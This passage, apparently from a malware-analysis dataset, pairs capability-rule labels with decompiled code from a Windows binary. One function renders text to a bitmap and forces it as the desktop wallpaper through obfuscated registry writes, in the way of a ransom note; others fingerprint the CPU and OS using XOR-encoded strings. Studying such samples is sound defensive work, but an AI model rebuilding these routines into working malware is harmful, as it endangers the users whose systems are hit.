}\n    var_70h = 0;\n    (*_sym.imp.gdiplus.dll_GdipCreateBitmapFromScan0)(iVar4, iVar5, 0, 0x26200a, 0, &var_70h);\n    var_14h = var_70h;\n    var_74h = 0;\n    (*_sym.imp.gdiplus.dll_GdipGetImageGraphicsContext)(var_70h, &var_74h);\n    var_64h = var_74h;\n    var_2ah._2_1_ = *0x422fc4 ^ 0x14;\n    var_2ah._0_2_ = 0x14;\n    var_2ah._3_1_ = *0x422fc4 >> 8;\n    var_36h._0_1_ = 0x14;\n    var_36h._1_2_ = 0x5500;\n    var_36h._3_1_ = 0;\n    var_26h = *0x422fc6 ^ 0x14;\n    var_24h = *0x422fc8 ^ 0x14;\n    lpSubKey._0_2_ = 0x66;\n    lpSubKey._2_1_ = 0x7d;\n    lpSubKey._3_1_ = 0;\n    var_23h = *0x422fc8 >> 8;\n    var_2eh._0_2_ = 0x75;\n    var_2eh._2_1_ = 0x78;\n    var_2eh._3_1_ = 0;\n    var_22h = *0x422fca ^ 0x14;\n    var_20h = str.image_bmp[0] ^ 0x14;\n    var_1fh = str.image_bmp[0] >> 8;\n    var_1eh = 0;\n    var_1dh = 0;\n    uVar10 = 0;\n    do {\n        *(&var_36h + uVar10 * 2 + 2) = *(&var_36h + uVar10 * 2 + 2) ^ 0x14;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0xb);\n    var_1eh = 0;\n    var_1dh = 0;\n    var_54h = 0;\n    var_ch = 0;\n    var_50h = (*_sym.imp.gdiplus.dll_GdipCreateFontFamilyFromName)(&var_36h + 2, 0, &var_ch);\n    var_8h = 0;\n    uVar6 = var_ch;\n    if (var_50h == 0) {\ncode_r0x0040c45d:\n        pcVar12 = _sym.imp.gdiplus.dll_GdipCreateFont;\n        var_50h = (*_sym.imp.gdiplus.dll_GdipCreateFont)(uVar6, 0x41c80000, 3, 3, &var_54h);\n        if (var_50h != 0) {\n            puVar9 = *0x42931c;\n            if (*0x42931c == NULL) {\n                *0x42931c = 0x429314;\n                uVar6 = (*_sym.imp.gdiplus.dll_GdipGetGenericFontFamilySansSerif)(0x429314);\n                puVar9 = *0x42931c;\n                (*0x42931c)[1] = uVar6;\n            }\n            var_50h = puVar9[1];\n            if (var_50h == 0) {\n                var_50h = (*pcVar12)(*puVar9, 0x41c80000, 3, 3, &var_54h);\n            }\n        }\n    }\n    else {\n        puVar9 = *0x42931c;\n        if (*0x42931c == NULL) {\n            *0x42931c = 0x429314;\n            uVar6 = (*_sym.imp.gdiplus.dll_GdipGetGenericFontFamilySansSerif)(0x429314);\n            puVar9 = *0x42931c;\n            (*0x42931c)[1] = uVar6;\n        }\n        var_50h = puVar9[1];\n        uVar6 = *puVar9;\n        if (var_50h == 0) goto code_r0x0040c45d;\n    }\n    (*_sym.imp.gdiplus.dll_GdipDeleteFontFamily)(var_ch);\n    var_b4h = 0x42480000;\n    var_ach = iVar4 + -100;\n    var_b0h = 0x42480000;\n    var_84h = 0;\n    var_80h = 0;\n    var_5ch = 0;\n    var_a8h = iVar5 + -0x32;\n    var_7ch = iVar4;\n    var_78h = iVar5;\n    var_58h = (*_sym.imp.gdiplus.dll_GdipCreateStringFormat)(0, 0, &var_5ch);\n    iVar4 = (*_sym.imp.gdiplus.dll_GdipSetStringFormatAlign)(var_5ch, 1);\n    if ((iVar4 == 0) || (var_58h = iVar4,  -1 < iVar4)) {\n        iVar4 = (*_sym.imp.gdiplus.dll_GdipSetStringFormatLineAlign)(var_5ch, 1);\n        if ((iVar4 == 0) || (var_58h = iVar4,  -1 < iVar4)) {\n            var_8h = -0x1433;\n            var_4ch = 0xff000000;\n            fcn.004010c0(&var_84h, &var_4ch, &var_8h, 2);\n            iVar5 = (*_sym.imp.gdiplus.dll_GdipFillRectangle)(var_64h, var_cch, var_84h, var_80h, var_7ch, var_78h);\n            iVar4 = var_68h;\n            pcVar12 = _sym.imp.msvcrt.dll_malloc;\n            if (((iVar5 == 0) || (-1 < iVar5)) && (iVar5 = (*_sym.imp.msvcrt.dll_malloc)(var_68h * 2),  iVar5 != 0)) {\n                var_10h = 0x250031;\n                var_ch = 0x53;\n                var_8h = CONCAT22(str.image_bmp[0], *0x422fca);\n                var_4h = 0;\n                (*_sym.imp.USER32.dll_wsprintfW)(iVar5, &var_10h + 2, var_6ch);\n                var_6ch = 0xffffd700;\n                var_68h = -0x2c2c2d;\n                fcn.004010c0(&var_84h, &var_68h, &var_6ch, 0);\n                iVar4 = (*_sym.imp.gdiplus.dll_GdipDrawString)\n                                  (var_64h, iVar5, iVar4, var_54h, &var_b4h, var_5ch, var_c0h);\n                if ((iVar4 == 0) || (-1 < iVar4)) {\n                    lpSubKey._2_1_ = str._s.bmp[0] ^ 0x4f;\n                    var_46h = 0x26004f;\n                    lpSubKey._3_1_ = str._s.bmp[0] >> 8;\n                    var_42h = 0x2e0022;\n                    var_2eh._0_2_ = str._s.bmp[1] ^ 0x4f;\n                    var_2eh._2_1_ = str._s.bmp[2] ^ 0x4f;\n                    var_3eh = 0x2a0028;\n                    var_2eh._3_1_ = str._s.bmp[2] >> 8;\n                    var_3ah = 0x2d0060;\n                    var_2ah._0_2_ = str._s.bmp[3] ^ 0x4f;\n                    var_2ah._2_1_ = str._s.bmp[4] ^ 0x4f;\n                    var_36h._0_1_ = 0x22;\n                    var_36h._1_2_ = 0x3f00;\n                    var_36h._3_1_ = 0;\n                    var_2ah._3_1_ = str._s.bmp[4] >> 8;\n                    lpSubKey._0_2_ = 0x4f;\n                    var_26h = str._s.bmp[5] ^ 0x4f;\n                    var_24h = str._s.bmp[6] ^ 0x4f;\n                    var_23h = str._s.bmp[6] >> 8;\n                    var_22h = *0x422fee ^ 0x4f;\n                    var_20h = str.WallpaperStyle._0_2_ ^ 0x4f;\n                    var_1fh = str.WallpaperStyle._0_2_ >> 8;\n                    var_1eh = 0;\n                    var_1dh = 0;\n                    uVar10 = 0;\n                    do {\n                        *(&var_46h + uVar10 * 2 + 2) = *(&var_46h + uVar10 * 2 + 2) ^ 0x4f;\n                        uVar10 = uVar10 + 1;\n                    } while (uVar10 < 0x13);\n                    var_1eh = 0;\n                    var_1dh = 0;\n                    var_4ch = 0;\n                    var_8h = 0;\n                    (*_sym.imp.gdiplus.dll_GdipGetImageEncodersSize)(&var_4ch, &var_8h);\n                    uVar6 = var_14h;\n                    if ((var_8h != 0) && (iVar5 = (*pcVar12)(var_8h),  uVar6 = var_14h,  iVar5 != 0)) {\n                        (*_sym.imp.gdiplus.dll_GdipGetImageEncoders)(var_4ch, var_8h, iVar5);\n                        uVar10 = 0;\n                        if (var_4ch != 0) {\n                            ppuVar14 = iVar5 + 0x30;\ncode_r0x0040c7d8:\n                            puVar7 = *ppuVar14;\n                            puVar11 = &var_46h + 2;\n                            do {\n                                uVar3 = *puVar7;\n                                bVar15 = uVar3 < *puVar11;\n                                if (uVar3 != *puVar11) {\ncode_r0x0040c806:\n                                    uVar8 = -bVar15 | 1;\n                                    goto code_r0x0040c80b;\n                                }\n                                if (uVar3 == 0) break;\n                                uVar3 = puVar7[1];\n                                bVar15 = uVar3 < puVar11[1];\n                                if (uVar3 != puVar11[1]) goto code_r0x0040c806;\n                                puVar7 = puVar7 + 2;\n                                puVar11 = puVar11 + 2;\n                            } while (uVar3 != 0);\n                            uVar8 = 0;\ncode_r0x0040c80b:\n                            if (uVar8 != 0) goto code_r0x0040c80f;\n                            puVar9 = uVar10 * 0x4c + iVar5;\n                            var_e0h = *puVar9;\n                            uStack224 = puVar9[1];\n                            uStack220 = puVar9[2];\n                            uStack216 = puVar9[3];\n                            (*_sym.imp.msvcrt.dll_free)(iVar5);\n                            uVar6 = var_14h;\n                            if (uVar10 != 0xffffffff) {\n                                (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, &lpPathName);\n                                (*_sym.imp.KERNEL32.dll_GetTempFileNameW)(&lpPathName, 0, 0, &ARG_0);\n                                var_3ah = 0x30026;\n                                var_2ah._0_2_ = *0x422fee ^ 0x26;\n                                var_2ah._2_1_ = str.WallpaperStyle._0_2_ ^ 0x26;\n                                var_36h._0_1_ = 0x55;\n                                var_36h._1_2_ = 0x800;\n                                var_36h._3_1_ = 0;\n                                var_2ah._3_1_ = str.WallpaperStyle._0_2_ >> 8;\n                                lpSubKey._0_2_ = 0x44;\n                                lpSubKey._2_1_ = 0x4b;\n                                lpSubKey._3_1_ = 0;\n                                var_26h = str.WallpaperStyle._2_2_ ^ 0x26;\n                                var_24h = str.WallpaperStyle._4_2_ ^ 0x26;\n                                var_2eh._0_2_ = 0x56;\n                                var_2eh._2_1_ = 0x26;\n                                var_2eh._3_1_ = 0;\n                                var_23h = str.WallpaperStyle._4_2_ >> 8;\n                                var_22h = str.WallpaperStyle._6_2_ ^ 0x26;\n                                var_20h = str.WallpaperStyle._8_2_ ^ 0x26;\n                                var_1fh = str.WallpaperStyle._8_2_ >> 8;\n                                var_1eh = 0;\n                                var_1dh = 0;\n                                uVar10 = 0;\n                                do {\n                                    *(&var_3ah + uVar10 * 2 + 2) = *(&var_3ah + uVar10 * 2 + 2) ^ 0x26;\n                                    uVar10 = uVar10 + 1;\n                                } while (uVar10 < 0xd);\n                                var_1eh = 0;\n                                var_1dh = 0;\n                                (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &var_3ah + 2, &ARG_0);\n                                uVar6 = var_14h;\n                                iVar4 = (*_sym.imp.gdiplus.dll_GdipSaveImageToFile)(var_14h, &ARG_0, &var_e0h, 0);\n                                if ((iVar4 != 0) && (iVar4 < 0)) goto code_r0x0040c825;\n                                uVar10 = 0;\n                                var_94h = *0x4243a0;\n                                uStack148 = *0x4243a4;\n                                uStack144 = *0x4243a8;\n                                uStack140 = *0x4243ac;\n                                do {\n                                    puVar2 = &var_94h + uVar10 + 1;\n                                    *puVar2 = *puVar2 ^ *0x4243a0;\n                                    uVar10 = uVar10 + 1;\n                                } while (uVar10 < 0xe);\n                                uStack140 = uStack140 & 0xffffff;\n                                var_10h = 0x3e3b0652;\n                                uVar10 = 0;\n                                var_ch = 0x3e330537;\n                                var_8h = 0x2233223e;\n                                var_4h = 0x2037;\n                                var_2h = 0;\n                                do {\n                                    puVar2 = &var_10h + uVar10 + 1;\n                                    *puVar2 = *puVar2 ^ 0x52;\n                                    uVar10 = uVar10 + 1;\n                                } while (uVar10 < 0xd);\n                                uVar10 = 0;\n                                var_2h = 0;\n                                var_36h._3_1_ = *0x4247c0;\n                                lpSubKey._0_2_ = *0x4247c0 >> 8;\n                                lpSubKey._2_1_ = *0x4247c0 >> 0x18;\n                                lpSubKey._3_1_ = *0x4247c4;\n                                var_2eh._0_2_ = *0x4247c4 >> 8;\n                                var_2eh._2_1_ = *0x4247c4 >> 0x18;\n                                var_2eh._3_1_ = *0x4247c8;\n                                var_2ah._0_2_ = *0x4247c8 >> 8;\n                                var_2ah._2_1_ = *0x4247c8 >> 0x18;\n                                var_2ah._3_1_ = *0x4247cc;\n                                var_26h = *0x4247cc >> 8;\n                                var_24h = *0x4247cc >> 0x18;\n                                var_23h = 0x60;\n                                var_22h = 0x6e76;\n                                var_20h = 0x71;\n                                var_1fh = 0x6a;\n                                var_1eh = 0x75;\n                                var_1dh = 0;\n                                do {\n                                    *(&lpSubKey + uVar10) = *(&lpSubKey + uVar10) ^ var_36h._3_1_;\n                                    uVar10 = uVar10 + 1;\n                                } while (uVar10 < 0x15);\n                                var_1dh = 0;\n                                iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &lpSubKey, &phkResult);\n                                pcVar12 = _sym.imp.ADVAPI32.dll_RegSetValueExA;\n                                if (iVar4 != 0) goto code_r0x0040c825;\n                                var_18h._0_2_ = 0x32;\n                                puVar9 = &var_18h;\n                                iVar4 = 0;\n                                do {\n                                    iVar5 = iVar4;\n                                    pcVar1 = puVar9 + 1;\n                                    puVar9 = puVar9 + 1;\n                                    iVar4 = iVar5 + 1;\n                                } while (*pcVar1 != '\\0');\n                                iVar4 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)\n                                                  (phkResult, &var_94h + 1, 0, 1, &var_18h, iVar5 + 2);\n                                if (iVar4 != 0) goto code_r0x0040c825;\n                                var_1ch = 0x30;\n                                do {\n                                    iVar5 = iVar4;\n                                    iVar4 = iVar5 + 1;\n                                } while (*(&var_1ch + iVar5 + 1) != '\\0');\n                                iVar4 = (*pcVar12)(phkResult, &var_10h + 1, 0, 1, &var_1ch, iVar5 + 2);\n                                if (iVar4 != 0) goto code_r0x0040c825;\n                                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n                                (*_sym.imp.USER32.dll_SystemParametersInfoW)(0x14, 0, &ARG_0, 3);\n                                uVar13 = 1;\n                                goto code_r0x0040c827;\n                            }\n                            goto code_r0x0040c825;\n                        }\n                        goto code_r0x0040c819;\n                    }\n                }\n                else {\ncode_r0x0040c819:\n                    (*_sym.imp.msvcrt.dll_free)(iVar5);\n                    uVar6 = var_14h;\n                }\ncode_r0x0040c825:\n                uVar13 = 0;\ncode_r0x0040c827:\n                pcVar12 = _sym.imp.gdiplus.dll_GdipDeleteBrush;\n                (*_sym.imp.gdiplus.dll_GdipDeleteBrush)(var_c0h);\n            }\n            else {\n                uVar13 = 0;\n                pcVar12 = _sym.imp.gdiplus.dll_GdipDeleteBrush;\n                uVar6 = var_14h;\n            }\n            (*pcVar12)(var_cch);\n            goto code_r0x0040c83d;\n        }\n    }\n    uVar13 = 0;\n    uVar6 = var_14h;\ncode_r0x0040c83d:\n    (*_sym.imp.gdiplus.dll_GdipDeleteStringFormat)(var_5ch);\n    (*_sym.imp.gdiplus.dll_GdipDeleteFont)(var_54h);\n    (*_sym.imp.gdiplus.dll_GdipDeleteGraphics)(var_64h);\n    (*_sym.imp.gdiplus.dll_GdipDisposeImage)(uVar6);\n    return uVar13;\ncode_r0x0040c80f:\n    uVar10 = uVar10 + 1;\n    ppuVar14 = ppuVar14 + 0x13;\n    if (var_4ch <= uVar10) goto code_r0x0040c819;\n    goto code_r0x0040c7d8;\n}\n",
        "token_count": 5537
    },
    "0040cd20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cd20(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (param_1 != NULL) {\n        iVar1 = *param_1;\n        while (iVar1 != 0) {\n            param_1 = param_1 + 1;\n            iVar2 = iVar2 + 1;\n            iVar1 = *param_1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 114
    },
    "0040cd50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cd50(char *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = *param_1;\n    while (cVar1 != '\\0') {\n        param_1 = param_1 + 1;\n        iVar2 = iVar2 + 1;\n        cVar1 = *param_1;\n    }\n    return iVar2;\n}\n",
        "token_count": 102
    },
    "0040d110": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d19b)\n// WARNING: Removing unreachable block (ram,0x0040d121)\n\nuint fcn.0040d110(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    bool bVar4;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = cpuid_basic_info(0);\n    if (0 < *piVar1) {\n        bVar3 = true;\n        bVar4 = true;\n        if (((piVar1[1] != 0x756e6547) || (piVar1[2] != 0x49656e69)) || (piVar1[3] != 0x6c65746e)) {\n            bVar3 = false;\n        }\n        if (((piVar1[1] != 0x68747541) || (piVar1[2] != 0x69746e65)) || (piVar1[3] != 0x444d4163)) {\n            bVar4 = false;\n        }\n        if (((bVar3) || (bVar4)) && (iVar2 = cpuid_Version_info(1),  (*(iVar2 + 0xc) & 0x2000000) != 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 323
    },
    "0040d370": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d370(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint16_t in_GS;\n    ulong uVar6;\n    uint *arglist;\n    uint var_338h;\n    uint var_330h;\n    uint lpBuffer;\n    uint lpSystemInfo;\n    uint lpVersionInformation;\n    int32_t var_1ach;\n    uint32_t var_1a8h;\n    uint var_116h;\n    uint var_110h;\n    uint uStack272;\n    uint uStack268;\n    uchar auStack264 [3];\n    uint var_101h;\n    uint uStack256;\n    uint uStack252;\n    uint32_t uStack248;\n    uint lpSystemTime;\n    uint var_eah;\n    uint var_e6h;\n    uint var_dfh;\n    uint uStack223;\n    uint uStack219;\n    uint uStack215;\n    uint var_cfh;\n    uint uStack205;\n    uint uStack201;\n    uint uStack197;\n    uint var_bdh;\n    uint uStack187;\n    uint uStack183;\n    uint uStack179;\n    uint var_abh;\n    uint uStack169;\n    uint uStack165;\n    uint uStack161;\n    uint var_99h;\n    uchar var_95h;\n    int32_t nSize;\n    int32_t var_90h;\n    uint var_8ah;\n    uint var_86h;\n    uint uStack134;\n    uint uStack130;\n    uint var_7ah;\n    uint var_76h;\n    uint var_72h;\n    uint var_6dh;\n    uint var_69h;\n    ushort var_65h;\n    uchar var_63h;\n    uint var_62h;\n    uint var_5eh;\n    uint var_5ah;\n    uint16_t var_56h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_43h;\n    uint var_3fh;\n    uchar var_3bh;\n    uint var_3ah;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uint var_31h;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uchar var_23h;\n    uint var_22h;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uint var_18h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    uchar var_10h;\n    uchar var_fh [3];\n    uint var_ch;\n    int32_t var_8h;\n    uchar var_2h;\n    uint var_1h;\n    \n    var_90h = 0;\n    fcn.0040ce50();\n    fcn.0040cc00(&var_1ach, 0, 0x98);\n    lpVersionInformation = 0x9c;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    var_8h = 0;\n    iVar2 = (*_sym.imp.NETAPI32.dll_NetWkstaGetInfo)(0, 100, &var_8h);\n    if (iVar2 == 0) {\n        var_1ach = *(var_8h + 0xc);\n        var_1a8h = *(var_8h + 0x10);\n    }\n    else if ((var_1ach == 6) && (var_1a8h == 2)) {\n        uVar6 = (*_sym.imp.ntdll.dll_VerSetConditionMask)(0, 0, 1, 1);\n        fcn.0040cc00(&var_338h, 0, 0x11c);\n        var_338h = 0x11c;\n        var_330h = 3;\n        iVar2 = (*_sym.imp.KERNEL32.dll_VerifyVersionInfoW)(&var_338h, 1, uVar6);\n        if (iVar2 != 0) {\n            var_1a8h = 3;\n        }\n    }\n    arglist = &lpSystemInfo;\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    if (var_1ach == 10) {\n        if (var_116h == '\\x01') {\n            var_31h._3_1_ = 0x52;\n            var_2dh = 0x4f;\n            var_2ch = 0x53;\n            var_2h = 99;\n            var_29h = 0x57;\n            var_25h = 0x31;\n            var_1h._0_1_ = 0x62;\n            var_2bh = 0x3a;\n            var_24h = 0x30;\n            var_2ah = 0x20;\n            var_28h = 0x69;\n            var_27h = 0x6e;\n            var_26h = 0x20;\n            var_23h = 0;\n            uVar3 = fcn.0040a0b0(&var_2dh, arglist);\n            uVar5 = CONCAT31(uVar3 >> 8, 2);\n        }\n        else {\n            uVar5 = 0;\n            stack0xfffffefc = *0x424390;\n            uStack256 = *0x424394;\n            uStack252 = *0x424398;\n            uStack248 = *0x42439c;\n            do {\n                var_101h._1_1_ = *0x424390;\n                puVar1 = &var_101h + uVar5 + 2;\n                *puVar1 = *puVar1 ^ var_101h._1_1_;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0xe);\n            uStack248 = uStack248 & 0xffffff;\n            uVar3 = fcn.0040a0b0(&var_101h + 2, arglist);\n            uVar5 = CONCAT31(uVar3 >> 8, 1);\n        }\n        goto code_r0x0040da01;\n    }\n    if (var_1ach == 6) {\n        if (var_1a8h == 3) {\n            if (var_116h == '\\x01') {\n                stack0xffffffb5 = 0x345d410e;\n                var_43h = 0x6067592e;\n                uVar5 = 0;\n                var_3fh = 0x3f20362e;\n                var_3bh = 0;\n                do {\n                    puVar1 = &var_48h + uVar5 + 2;\n                    *puVar1 = *puVar1 ^ 0xe;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0xb);\n                var_3bh = 0;\n                uVar3 = fcn.0040a0b0(&var_48h + 2, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 4);\n            }\n            else {\n                uVar5 = 0;\n                stack0xffffff53 = *0x424530;\n                uStack169 = str.elRUehime_t_v_nd307._0_4_;\n                uStack165 = str.elRUehime_t_v_nd307._4_4_;\n                uStack161 = str.elRUehime_t_v_nd307._8_4_;\n                var_99h = 0x9691b09;\n                do {\n                    var_abh._2_1_ = *0x424530;\n                    puVar1 = &var_abh + uVar5 + 3;\n                    *puVar1 = *puVar1 ^ var_abh._2_1_;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0x13);\n                var_95h = 0;\n                uVar3 = fcn.0040a0b0(&var_abh + 3, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 3);\n            }\n            goto code_r0x0040da01;\n        }\n        if (var_1a8h == 2) {\n            if (var_116h == '\\x01') {\n                var_18h._1_1_ = 0x74;\n                var_18h._2_1_ = 0x4f;\n                var_18h._3_1_ = 0x53;\n                var_1h._0_1_ = 0x4c;\n                var_14h = 0x3a;\n                var_12h = 0x57;\n                var_11h = 0x69;\n                var_fh[2] = 0;\n                var_10h = 0x6e;\n                var_13h = 0x20;\n                var_fh[0] = 0x20;\n                var_fh[1] = 0x38;\n                uVar3 = fcn.0040a0b0(&var_18h + 2, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 6);\n            }\n            else {\n                uVar5 = 0;\n                stack0xffffff41 = *0x424c00;\n                uStack187 = *0x424c04;\n                uStack183 = str.M___M___ah_rbcat_roxtdcj_r_._0_4_;\n                uStack179 = str.M___M___ah_rbcat_roxtdcj_r_._4_4_;\n                var_abh._0_2_ = 0x5f;\n                do {\n                    var_bdh._2_1_ = *0x424c00;\n                    puVar1 = &var_bdh + uVar5 + 3;\n                    *puVar1 = *puVar1 ^ var_bdh._2_1_;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0x10);\n                var_abh._0_2_ = var_abh & 0xff;\n                uVar3 = fcn.0040a0b0(&var_bdh + 3, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 5);\n            }\n            goto code_r0x0040da01;\n        }\n        if (var_1a8h == 1) {\n            if (var_116h == '\\x01') {\n                var_22h._0_1_ = 0x46;\n                var_22h._1_1_ = 0x4f;\n                var_22h._2_1_ = 0x53;\n                var_1h._0_1_ = 0x71;\n                var_22h._3_1_ = 0x3a;\n                var_1dh = 0x57;\n                var_1ch = 0x69;\n                var_18h._0_1_ = 0;\n                var_1bh = 0x6e;\n                var_1eh = 0x20;\n                var_1ah = 0x20;\n                var_19h = 0x37;\n                uVar3 = fcn.0040a0b0(&var_22h + 1, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 8);\n            }\n            else {\n                uVar5 = 0;\n                var_86h = *0x424ba0;\n                uStack134 = *0x424ba4;\n                uStack130 = *0x424ba8;\n                var_7ah = *0x424bac;\n                var_76h = 0x5b3b4951;\n                do {\n                    var_86h._0_1_ = *0x424ba0;\n                    puVar1 = &var_86h + uVar5 + 1;\n                    *puVar1 = *puVar1 ^ var_86h;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0x13);\n                var_72h._0_1_ = 0;\n                uVar3 = fcn.0040a0b0(&var_86h + 1, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 7);\n            }\n            goto code_r0x0040da01;\n        }\n        if (var_1a8h == 0) {\n            if (var_116h == '\\x01') {\n                stack0xffffff8b = 0x66f733c;\n                var_6dh = 0x52556b1c;\n                uVar5 = 0;\n                var_69h = 0x4f556a1c;\n                var_65h = 0x5d48;\n                do {\n                    puVar1 = &var_72h + uVar5 + 2;\n                    *puVar1 = *puVar1 ^ 0x3c;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0xd);\n                var_63h = 0;\n                uVar3 = fcn.0040a0b0(&var_72h + 2, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 10);\n            }\n            else {\n                uVar5 = 0;\n                stack0xffffff2f = *0x424eb0;\n                uStack205 = *0x424eb4;\n                uStack201 = *0x424eb8;\n                uStack197 = *0x424ebc;\n                var_bdh._0_2_ = 0x77;\n                do {\n                    var_cfh._2_1_ = *0x424eb0;\n                    puVar1 = &var_cfh + uVar5 + 3;\n                    *puVar1 = *puVar1 ^ var_cfh._2_1_;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0x10);\n                var_bdh._0_2_ = var_bdh & 0xff;\n                uVar3 = fcn.0040a0b0(&var_cfh + 3, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 9);\n            }\n            goto code_r0x0040da01;\n        }\n    }\n    else if (var_1ach == 5) {\n        if (var_1a8h == 2) {\n            if ((var_116h == '\\x01') && (lpSystemInfo == 9)) {\n                uVar5 = 0;\n                var_110h = str.H_aerh._0_4_;\n                uStack272 = *0x4243e4;\n                uStack268 = *0x4243e8;\n                _auStack264 = *0x4243ec;\n                do {\n                    var_110h._0_1_ = str.H_aerh._0_4_;\n                    puVar1 = &var_110h + uVar5 + 1;\n                    *puVar1 = *puVar1 ^ var_110h;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0xe);\n                _auStack264 = _auStack264 & 0xffffff;\n                uVar3 = fcn.0040a0b0(&var_110h + 1, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 0xb);\n            }\n            else {\n                uVar5 = 0;\n                var_dfh = *0x424700;\n                uStack223 = *0x424704;\n                uStack219 = *0x424708;\n                uStack215 = *0x42470c;\n                var_cfh._0_2_ = 0x28;\n                do {\n                    var_dfh._0_1_ = *0x424700;\n                    puVar1 = &var_dfh + uVar5 + 1;\n                    *puVar1 = *puVar1 ^ var_dfh;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0x10);\n                var_cfh._0_2_ = var_cfh & 0xff;\n                uVar3 = fcn.0040a0b0(&var_dfh + 1, arglist);\n                uVar5 = CONCAT31(uVar3 >> 8, 0xc);\n            }\n            goto code_r0x0040da01;\n        }\n        if (var_1a8h == 1) {\n            var_3ah._0_1_ = 0x7a;\n            var_3ah._1_1_ = 0x4f;\n            var_3ah._2_1_ = 0x53;\n            var_1h._0_1_ = 0x22;\n            var_35h = 0x57;\n            var_31h._0_1_ = 0x58;\n            var_2h = 0x2a;\n            var_3ah._3_1_ = 0x3a;\n            var_31h._1_1_ = 0x50;\n            var_36h = 0x20;\n            var_34h = 0x69;\n            var_33h = 0x6e;\n            var_32h = 0x20;\n            var_31h._2_1_ = 0;\n            uVar3 = fcn.0040a0b0(&var_3ah + 1, arglist);\n            uVar5 = CONCAT31(uVar3 >> 8, 0xd);\n            goto code_r0x0040da01;\n        }\n        if (var_1a8h == 0) {\n            var_62h = 0x1c756926;\n            var_5eh = 0x484f7106;\n            var_5ah = 0x16161406;\n            var_56h = 0x16;\n            uVar5 = var_1a8h;\n            do {\n                puVar1 = &var_62h + uVar5 + 1;\n                *puVar1 = *puVar1 ^ 0x26;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0xc);\n            var_56h = var_56h & 0xff;\n            uVar3 = fcn.0040a0b0(&var_62h + 1, arglist);\n            uVar5 = CONCAT31(uVar3 >> 8, 0xe);\n            goto code_r0x0040da01;\n        }\n    }\n    var_54h = 0x573e226d;\n    var_50h = 0x603384d;\n    uVar5 = 0;\n    var_4ch = 0x31a0203;\n    var_48h._0_1_ = 0;\n    do {\n        puVar1 = &var_54h + uVar5 + 1;\n        *puVar1 = *puVar1 ^ 0x6d;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0xb);\n    var_48h._0_1_ = 0;\n    uVar5 = fcn.0040a0b0(&var_54h + 1, arglist);\n    uVar5 = uVar5 & 